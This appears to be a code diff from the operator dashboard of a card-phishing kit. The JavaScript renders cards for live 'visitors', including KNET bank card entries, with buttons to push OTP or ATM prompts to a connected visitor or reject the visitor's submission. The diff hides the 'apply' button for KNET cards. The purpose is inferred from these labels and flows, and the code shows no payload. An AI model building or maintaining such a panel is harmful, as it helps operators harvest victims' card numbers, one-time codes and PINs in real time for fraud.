@@ -2063,8 +2063,7 @@
 
               // Action buttons for KNET card
               html += '<div class="flex gap-2 mt-3">';
-              html += '<button onclick="cardActionApp(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق</button>';
-              html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
+                            html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
               html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
               html += '</div>';
@@ -2134,7 +2133,7 @@
         html += '</div></div></div>';
         if (_d.submitted) {
           html += '<div class="flex gap-2 mt-3">';
-          html += '<button onclick="cardActionApp(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium">تطبيق</button>';
+          if (!_dKNET) html += '<button onclick="cardActionApp(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium">تطبيق</button>';
           html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium">OTP</button>';
           if (!_dKNET) html += '<button onclick="cardActionATM(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium">ATM</button>';
           html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium">رفض</button>';
